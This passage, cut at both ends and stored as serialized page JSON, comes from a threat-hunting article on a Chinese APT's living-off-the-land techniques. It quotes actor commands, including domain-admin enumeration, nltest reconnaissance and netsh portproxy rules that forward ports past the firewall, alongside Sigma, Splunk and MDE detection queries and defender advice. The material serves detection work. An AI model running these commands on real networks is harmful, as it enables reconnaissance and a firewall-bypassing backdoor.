\u002Fdom","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"bash"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_30":{"__typename":"Paragraph","id":"dcff7a17d5b3_30","name":"e761","type":"PRE","href":null,"layout":null,"metadata":null,"text":"net group “Domain Admins” \u002Fdom","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"bash"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_31":{"__typename":"Paragraph","id":"dcff7a17d5b3_31","name":"e34a","type":"P","href":null,"layout":null,"metadata":null,"text":"Sigma Rule — Hunting Query Chinese APT Enumeration of the Environment","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_32":{"__typename":"Paragraph","id":"dcff7a17d5b3_32","name":"dead","type":"MIXTAPE_EMBED","href":null,"layout":null,"metadata":null,"text":"Sigma-Rules\u002FHunting Query Chinese APT Enumeration of the Environment.yml at main ·…\nSigma Rules Threat Intelligence, Threat Hunting. Contribute to Schmouni242\u002FSigma-Rules development by creating an…github.com","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":0,"end":208,"href":"https:\u002F\u002Fgithub.com\u002FSchmouni242\u002FSigma-Rules\u002Fblob\u002Fmain\u002FHunting%20Query%20Chinese%20APT%20Enumeration%20of%20the%20Environment.yml","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":0,"end":83,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"EM","start":84,"end":198,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":{"__typename":"MixtapeMetadata","href":"https:\u002F\u002Fgithub.com\u002FSchmouni242\u002FSigma-Rules\u002Fblob\u002Fmain\u002FHunting%20Query%20Chinese%20APT%20Enumeration%20of%20the%20Environment.yml","mediaResource":{"__typename":"MediaResource","mediumCatalog":null},"thumbnailImageId":"0*lob0zTD2WQ3Ong9P"}},"Paragraph:dcff7a17d5b3_33":{"__typename":"Paragraph","id":"dcff7a17d5b3_33","name":"fe17","type":"H4","href":null,"layout":null,"metadata":null,"text":"netsh","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_34":{"__typename":"Paragraph","id":"dcff7a17d5b3_34","name":"244b","type":"P","href":null,"layout":null,"metadata":null,"text":"Enumeration netsh","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_35":{"__typename":"Paragraph","id":"dcff7a17d5b3_35","name":"81ce","type":"PRE","href":null,"layout":null,"metadata":null,"text":"netsh interface firewall show all","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"kotlin"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_36":{"__typename":"Paragraph","id":"dcff7a17d5b3_36","name":"185a","type":"PRE","href":null,"layout":null,"metadata":null,"text":"netsh interface portproxy show all","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"kotlin"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_37":{"__typename":"Paragraph","id":"dcff7a17d5b3_37","name":"4de3","type":"PRE","href":null,"layout":null,"metadata":null,"text":"netsh interface portproxy show v4tov4","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"kotlin"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_38":{"__typename":"Paragraph","id":"dcff7a17d5b3_38","name":"159d","type":"PRE","href":null,"layout":null,"metadata":null,"text":"netsh firewall show all","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"sql"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_39":{"__typename":"Paragraph","id":"dcff7a17d5b3_39","name":"83bb","type":"PRE","href":null,"layout":null,"metadata":null,"text":"netsh portproxy show v4tov4","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"sql"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_40":{"__typename":"Paragraph","id":"dcff7a17d5b3_40","name":"f670","type":"P","href":null,"layout":null,"metadata":null,"text":"Sigma Rule — Hunting Query Chinese APT Enumeration of the Environment","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_41":{"__typename":"Paragraph","id":"dcff7a17d5b3_41","name":"4dc5","type":"MIXTAPE_EMBED","href":null,"layout":null,"metadata":null,"text":"Sigma-Rules\u002FHunting Query Chinese APT Enumeration of the Environment.yml at main ·…\nSigma Rules Threat Intelligence, Threat Hunting. Contribute to Schmouni242\u002FSigma-Rules development by creating an…github.com","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":0,"end":208,"href":"https:\u002F\u002Fgithub.com\u002FSchmouni242\u002FSigma-Rules\u002Fblob\u002Fmain\u002FHunting%20Query%20Chinese%20APT%20Enumeration%20of%20the%20Environment.yml","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":0,"end":83,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"EM","start":84,"end":198,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":{"__typename":"MixtapeMetadata","href":"https:\u002F\u002Fgithub.com\u002FSchmouni242\u002FSigma-Rules\u002Fblob\u002Fmain\u002FHunting%20Query%20Chinese%20APT%20Enumeration%20of%20the%20Environment.yml","mediaResource":{"__typename":"MediaResource","mediumCatalog":null},"thumbnailImageId":"0*lob0zTD2WQ3Ong9P"}},"Paragraph:dcff7a17d5b3_42":{"__typename":"Paragraph","id":"dcff7a17d5b3_42","name":"4abe","type":"P","href":null,"layout":null,"metadata":null,"text":"And Splunk:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_43":{"__typename":"Paragraph","id":"dcff7a17d5b3_43","name":"b3dc","type":"PRE","href":null,"layout":null,"metadata":null,"text":"index=* source=”WinEventLog:*” AND ((Image=”*\\\\netsh.exe” OR OriginalFileName=”netsh.exe”) AND ((CommandLine=”*netsh *”) AND (CommandLine=”*show *”) AND (CommandLine=”*firewall *”) AND (CommandLine=”*config *” OR CommandLine=”*state *” OR CommandLine=”*rule *” OR CommandLine=”*name=all*”)))","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"markdown"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_44":{"__typename":"Paragraph","id":"dcff7a17d5b3_44","name":"cba3","type":"P","href":null,"layout":null,"metadata":null,"text":"And MDE:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_45":{"__typename":"Paragraph","id":"dcff7a17d5b3_45","name":"1faf","type":"PRE","href":null,"layout":null,"metadata":null,"text":"DeviceProcessEvents | where ((FolderPath endswith @’\\netsh.exe’ or InitiatingProcessVersionInfoOriginalFileName =~ @’netsh.exe’ or ProcessVersionInfoOriginalFileName =~ @’netsh.exe’) and (ProcessCommandLine contains @’netsh ‘ and ProcessCommandLine contains @’show ‘ and ProcessCommandLine contains @’firewall ‘ and (ProcessCommandLine contains @’config ‘ or ProcessCommandLine contains @’state ‘ or ProcessCommandLine contains @’rule ‘ or ProcessCommandLine contains @’name=all’)))","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"DISABLED","lang":null},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_46":{"__typename":"Paragraph","id":"dcff7a17d5b3_46","name":"b499","type":"H4","href":null,"layout":null,"metadata":null,"text":"Port Proxy T1090 Information portproxy","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_47":{"__typename":"Paragraph","id":"dcff7a17d5b3_47","name":"56d1","type":"P","href":null,"layout":null,"metadata":null,"text":"The actor has used the following commands to enable port forwarding [T1090] on the host: “cmd.exe \u002Fc “netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=9999 connectaddress= connectport=8443 protocol=tcp””","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_48":{"__typename":"Paragraph","id":"dcff7a17d5b3_48","name":"04a9","type":"PRE","href":null,"layout":null,"metadata":null,"text":"“cmd.exe \u002Fc netsh interface portproxy add v4tov4 listenport=50100 listenaddress=0.0.0.0 connectport=1433 connectaddress=”","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"kotlin"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_49":{"__typename":"Paragraph","id":"dcff7a17d5b3_49","name":"8aff","type":"P","href":null,"layout":null,"metadata":null,"text":"Sigma Rule — Portproxy add command","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_50":{"__typename":"Paragraph","id":"dcff7a17d5b3_50","name":"fb9e","type":"MIXTAPE_EMBED","href":null,"layout":null,"metadata":null,"text":"Sigma-Rules\u002FPortproxy add command.yml at main · Schmouni242\u002FSigma-Rules\nSigma Rules Threat Intelligence, Threat Hunting. Contribute to Schmouni242\u002FSigma-Rules development by creating an…github.com","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":0,"end":196,"href":"https:\u002F\u002Fgithub.com\u002FSchmouni242\u002FSigma-Rules\u002Fblob\u002Fmain\u002FPortproxy%20add%20command.yml","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":0,"end":71,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"EM","start":72,"end":186,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":{"__typename":"MixtapeMetadata","href":"https:\u002F\u002Fgithub.com\u002FSchmouni242\u002FSigma-Rules\u002Fblob\u002Fmain\u002FPortproxy%20add%20command.yml","mediaResource":{"__typename":"MediaResource","mediumCatalog":null},"thumbnailImageId":"0*PTyrpBdoScrwVxcw"}},"Paragraph:dcff7a17d5b3_51":{"__typename":"Paragraph","id":"dcff7a17d5b3_51","name":"252b","type":"P","href":null,"layout":null,"metadata":null,"text":"MDE:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_52":{"__typename":"Paragraph","id":"dcff7a17d5b3_52","name":"53e8","type":"PRE","href":null,"layout":null,"metadata":null,"text":"DeviceProcessEvents | where ((FolderPath endswith @’\\cmd.exe’ or InitiatingProcessVersionInfoOriginalFileName =~ @’cmd.exe’ or ProcessVersionInfoOriginalFileName =~ @’cmd.exe’) and (ProcessCommandLine contains @’netsh ‘ and ProcessCommandLine contains @’interface ‘ and ProcessCommandLine contains @’portproxy ‘ and (ProcessCommandLine contains @’add ‘ or ProcessCommandLine contains @’listenport ‘ or ProcessCommandLine contains @’connetaddress= ‘ or ProcessCommandLine contains @’connectport=1433')))","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"sql"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_53":{"__typename":"Paragraph","id":"dcff7a17d5b3_53","name":"efce","type":"P","href":null,"layout":null,"metadata":null,"text":"Splunk","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_54":{"__typename":"Paragraph","id":"dcff7a17d5b3_54","name":"c0f7","type":"PRE","href":null,"layout":null,"metadata":null,"text":"index=* source=”WinEventLog:*” AND ((Image=”*\\\\cmd.exe” OR OriginalFileName=”cmd.exe”) AND ((CommandLine=”*netsh *”) AND (CommandLine=”*interface *”) AND (CommandLine=”*portproxy *”) AND (CommandLine=”*add *” OR CommandLine=”*listenport *” OR CommandLine=”*connetaddress= *” OR CommandLine=”*connectport=1433*”)))","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"DISABLED","lang":null},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_55":{"__typename":"Paragraph","id":"dcff7a17d5b3_55","name":"6e15","type":"BQ","href":null,"layout":null,"metadata":null,"text":"Where is replaced with an IPv4 address internal to the network, omitting the \u003C \u003E’s. Netsh is a built-in Windows command line scripting utility that can display or modify the network settings of a host, including the Windows Firewall. The portproxy add command is used to create a host:port proxy that will forward incoming connections on the provided listenaddress and listenport to the connectaddress and connectport. Administrative privileges are required to execute the portproxy command. Each portproxy command above will create a registry key…","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":419,"end":482,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_56":{"__typename":"Paragraph","id":"dcff7a17d5b3_56","name":"e97a","type":"PRE","href":null,"layout":null,"metadata":null,"text":"HKLM\\SYSTEM\\CurrentControlSet\\Services\\PortProxy\\v4tov4\\tcp\\","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"DISABLED","lang":null},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_57":{"__typename":"Paragraph","id":"dcff7a17d5b3_57","name":"f91f","type":"BQ","href":null,"layout":null,"metadata":null,"text":"Defenders should look for the presence of keys in this path and investigate any anomalous entries. Note: Using port proxies is not common for legitimate system administration since they can constitute a backdoor into the network that bypasses firewall policies. Administrators should limit port proxy usage within environments and only enable them for the period of time in which they are required. Defenders should also use unusual IP addresses and ports in the command lines or registry entries to identify other hosts that are potentially included in actor actions. All hosts on the network should be examined for new and unusual firewall and port forwarding rules, as well as IP addresses and ports specified by the actor. If network traffic or logging is available, defenders should attempt to identify what traffic was forwarded though the port proxies to aid in the hunt operation. As previously mentioned, identifying the associated user account that made the networking changes can also aid in the hunt operation. Firewall rule additions and changes can be viewed in Windows Event Viewer by navigating to: Applications and Service Logs | Microsoft | Windows | Windows Firewall With Advanced Security | Firewall. In addition to host-level changes, defenders should review perimeter firewall configurations for unauthorized changes and\u002For entries that may permit external connections to internal hosts. The actor is known to target perimeter devices in their operations. Firewall logs should be reviewed for any connections to systems on the ports listed in any portproxy commands discovered.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":64,"end":97,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":569,"end":667,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":1115,"end":1219,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":1314,"end":1408,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_58":{"__typename":"Paragraph","id":"dcff7a17d5b3_58","name":"ea15","type":"H4","href":null,"layout":null,"metadata":null,"text":"nltest","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_59":{"__typename":"Paragraph","id":"dcff7a17d5b3_59","name":"5edd","type":"MIXTAPE_EMBED","href":null,"layout":null,"metadata":null,"text":"sigma\u002Frules\u002Fwindows\u002Fprocess_creation\u002Fproc_creation_win_nltest_execution.yml at master ·…\nMain Sigma Rule Repository. Contribute to SigmaHQ\u002Fsigma development by creating an account on GitHub.github.com","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":0,"end":200,"href":"https:\u002F\u002Fgithub.com\u002FSigmaHQ\u002Fsigma\u002Fblob\u002Fmaster\u002Frules\u002Fwindows\u002Fprocess_creation\u002Fproc_creation_win_nltest_execution.yml","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":0,"end":88,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"EM","start":89,"end":190,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":{"__typename":"MixtapeMetadata","href":"https:\u002F\u002Fgithub.com\u002FSigmaHQ\u002Fsigma\u002Fblob\u002Fmaster\u002Frules\u002Fwindows\u002Fprocess_creation\u002Fproc_creation_win_nltest_execution.yml","mediaResource":{"__typename":"MediaResource","mediumCatalog":null},"thumbnailImageId":"0*dMM_JghmxOP98AES"}},"Paragraph:dcff7a17d5b3_60":{"__typename":"Paragraph","id":"dcff7a17d5b3_60","name":"721b","type":"P","href":null,"layout":null,"metadata":null,"text":"Splunk:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_61":{"__typename":"Paragraph","id":"dcff7a17d5b3_61","name":"5b3b","type":"PRE","href":null,"layout":null,"metadata":null,"text":"index=* source=”WinEventLog:*” AND (Image=”*\\\\nltest.exe” OR OriginalFileName=”nltestrk.exe”)","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"DISABLED","lang":null},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_62":{"__typename":"Paragraph","id":"dcff7a17d5b3_62","name":"fce1","type":"P","href":null,"layout":null,"metadata":null,"text":"MDE:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_63":{"__typename":"Paragraph","id":"dcff7a17d5b3_63","name":"5ff5","type":"PRE","href":null,"layout":null,"metadata":null,"text":"DeviceProcessEvents | where (FolderPath endswith @’\\nltest.exe’ or InitiatingProcessVersionInfoOriginalFileName =~ @’nltestrk.exe’ or ProcessVersionInfoOriginalFileName =~ @’nltestrk.exe’)","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"DISABLED","lang":null},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_64":{"__typename":"Paragraph","id":"dcff7a17d5b3_64","name":"82f0","type":"MIXTAPE_EMBED","href":null,"layout":null,"metadata":null,"text":"sigma\u002Frules\u002Fwindows\u002Fprocess_creation\u002Fproc_creation_win_nltest_recon.yml at master · SigmaHQ\u002Fsigma\nMain Sigma Rule Repository. Contribute to SigmaHQ\u002Fsigma development by creating an account on GitHub.github.com","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":0,"end":209,"href":"https:\u002F\u002Fgithub.com\u002FSigmaHQ\u002Fsigma\u002Fblob\u002Fmaster\u002Frules\u002Fwindows\u002Fprocess_creation\u002Fproc_creation_win_nltest_recon.yml","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":0,"end":97,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"EM","start":98,"end":199,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":{"__typename":"MixtapeMetadata","href":"https:\u002F\u002Fgithub.com\u002FSigmaHQ\u002Fsigma\u002Fblob\u002Fmaster\u002Frules\u002Fwindows\u002Fprocess_creation\u002Fproc_creation_win_nltest_recon.yml","mediaResource":{"__typename":"MediaResource","mediumCatalog":null},"thumbnailImageId":"0*SuGKifWSqweN6QJc"}},"Paragraph:dcff7a17d5b3_65":{"__typename":"Paragraph","id":"dcff7a17d5b3_65","name":"0063","type":"P","href":null,"layout":null,"metadata":null,"text":"MDE:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_66":{"__typename":"Paragraph","id":"dcff7a17d5b3_66","name":"b0d6","type":"PRE","href":null,"layout":null,"metadata":null,"text":"DeviceProcessEvents | where ((FolderPath endswith @’\\nltest.exe’ or InitiatingProcessVersionInfoOriginalFileName =~ @’nltestrk.exe’ or ProcessVersionInfoOriginalFileName =~ @’nltestrk.exe’) and ((ProcessCommandLine contains @’\u002Fserver’ and ProcessCommandLine contains @’\u002Fquery’) or (ProcessCommandLine contains @’\u002Fdclist:’ or ProcessCommandLine contains @’\u002Fparentdomain’ or ProcessCommandLine contains @’\u002Fdomain_trusts’ or ProcessCommandLine contains @’\u002Fall_trusts’ or ProcessCommandLine contains @’\u002Ftrusted_domains’ or ProcessCommandLine contains @’\u002Fuser’)))","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"bash"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_67":{"__typename":"Paragraph","id":"dcff7a17d5b3_67","name":"4745","type":"P","href":null,"layout":null,"metadata":null,"text":"Splunk","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_68":{"__typename":"Paragraph","id":"dcff7a17d5b3_68","name":"857b","type":"PRE","href":null,"layout":null,"metadata":null,"text":"index=* source=”WinEventLog:*” AND ((Image=”*\\\\nltest.exe” OR OriginalFileName=”nltestrk.exe”) AND (((CommandLine=”*\u002Fserver*”) AND (CommandLine=”*\u002Fquery*”)) OR (CommandLine=”*\u002Fdclist:*” OR CommandLine=”*\u002Fparentdomain*” OR CommandLine=”*\u002Fdomain_trusts*” OR CommandLine=”*\u002Fall_trusts*” OR CommandLine=”*\u002Ftrusted_domains*” OR CommandLine=”*\u002Fuser*”))) | table Image,User,CommandLine,ParentCommandLine","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"bash"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_69":{"__typename":"Paragraph","id":"dcff7a17d5b3_69","name":"c82c","type":"H4","href":null,"layout":null,"metadata":null,"text":"PowerShell","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_70":{"__typename":"Paragraph","id":"dcff7a17d5b3_70","name":"c7b1","type":"BQ","href":null,"layout":null,"metadata":null,"text":"The actor has used the following PowerShell [T1059.001] command to identify successful logons to the host [T1033]:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_71":{"__typename":"Paragraph","id":"dcff7a17d5b3_71","name":"f30c","type":"PRE","href":null,"layout":null,"metadata":null,"text":"Get-EventLog security -instanceid 4624","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"DISABLED","lang":null},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_72":{"__typename":"Paragraph","id":"dcff7a17d5b3_72","name":"3a89","type":"BQ","href":null,"layout":null,"metadata":null,"text":"Note: Event ID 4624 is logged when a user successfully logs on to a host and contains useful information such as the logon type (e.g., interactive or networking), associated user and computer account names, and the logon time. Event ID 4624 entries can be viewed in Windows Event Viewer by navigating to: Windows Logs | Security. PowerShell logs can be viewed in Event Viewer: Applications and Service Logs | Windows PowerShell. This command identifies what user account they are currently leveraging to access the network, identify other users logged on to the host, or identify how their actions are being logged. If the actor is using a password spray technique [T1110.003], there may be several failed logon (Event ID 4625) events for several different user accounts, followed by one or more successful logons (Event ID 4624) within a short period of time. This period may vary by actor but can range from a few seconds to a few minutes. If the actor is using brute force password attempts [T1110] against a single user account, there may be several Event ID 4625 entries for that account, followed by a successful logon Event ID 4624. Defenders should also look for abnormal account activity, such as logons outside of normal working hours and impossible time-anddistance logons (e.g., a user logging on from two geographically separated locations at the same time).","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":305,"end":427,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_73":{"__typename":"Paragraph","id":"dcff7a17d5b3_73","name":"418e","type":"P","href":null,"layout":null,"metadata":null,"text":"Sigma Rule — LOLBAS Chinese APT successful Logon on Host","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_74":{"__typename":"Paragraph","id":"dcff7a17d5b3_74","name":"ed02","type":"MIXTAPE_EMBED","href":null,"layout":null,"metadata":null,"text":"Sigma-Rules\u002FLOLBAS Chinese APT Succesful Logon on Host.yml at main · Schmouni242\u002FSigma-Rules\nSigma Rules Threat Intelligence, Threat Hunting. Contribute to Schmouni242\u002FSigma-Rules development by creating an…github.com","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":0,"end":217,"href":"https:\u002F\u002Fgithub.com\u002FSchmouni242\u002FSigma-Rules\u002Fblob\u002Fmain\u002FLOLBAS%20Chinese%20APT%20Succesful%20Logon%20on%20Host.yml","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":0,"end":92,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"EM","start":93,"end":207,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":{"__typename":"MixtapeMetadata","href":"https:\u002F\u002Fgithub.com\u002FSchmouni242\u002FSigma-Rules\u002Fblob\u002Fmain\u002FLOLBAS%20Chinese%20APT%20Succesful%20Logon%20on%20Host.yml","mediaResource":{"__typename":"MediaResource","mediumCatalog":null},"thumbnailImageId":"0*KAtmNpFzusfR0N2g"}},"Paragraph:dcff7a17d5b3_75":{"__typename":"Paragraph","id":"dcff7a17d5b3_75","name":"8e36","type":"P","href":null,"layout":null,"metadata":null,"text":"Splunk","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_76":{"__typename":"Paragraph","id":"dcff7a17d5b3_76","name":"b948","type":"PRE","href":null,"layout":null,"metadata":null,"text":"index=* source=”WinEventLog:*” AND ((Image=”*\\\\powershell.exe” OR OriginalFileName=”powershell.exe”) AND CommandLine=”*Get-EventLog*” AND (CommandLine=”*Get-EventLog security -instanceid 4624*” OR CommandLine=”*Get-Eventlog security*”))","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"DISABLED","lang":null},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_77":{"__typename":"Paragraph","id":"dcff7a17d5b3_77","name":"b118","type":"P","href":null,"layout":null,"metadata":null,"text":"MDE","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_78":{"__typename":"Paragraph","id":"dcff7a17d5b3_78","name":"e146","type":"PRE","href":null,"layout":null,"metadata":null,"text":"DeviceProcessEvents | where ((FolderPath endswith @’\\powershell.exe’ or InitiatingProcessVersionInfoOriginalFileName =~ @’powershell.exe’ or ProcessVersionInfoOriginalFileName =~ @’powershell.exe’) and ProcessCommandLine contains @’Get-EventLog’ and (ProcessCommandLine contains @’Get-EventLog security -instanceid 4624' or ProcessCommandLine contains @’Get-Eventlog security’))","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"DISABLED","lang":null},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_79":{"__typename":"Paragraph","id":"dcff7a17d5b3_79","name":"39c2","type":"H4","href":null,"layout":null,"metadata":null,"text":"req query\u002Fsave","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_80":{"__typename":"Paragraph","id":"dcff7a17d5b3_80","name":"7e79","type":"P","href":null,"layout":null,"metadata":null,"text":"Sigma Rule — LOLBAS Chinese APT Credential Theft Query Registry 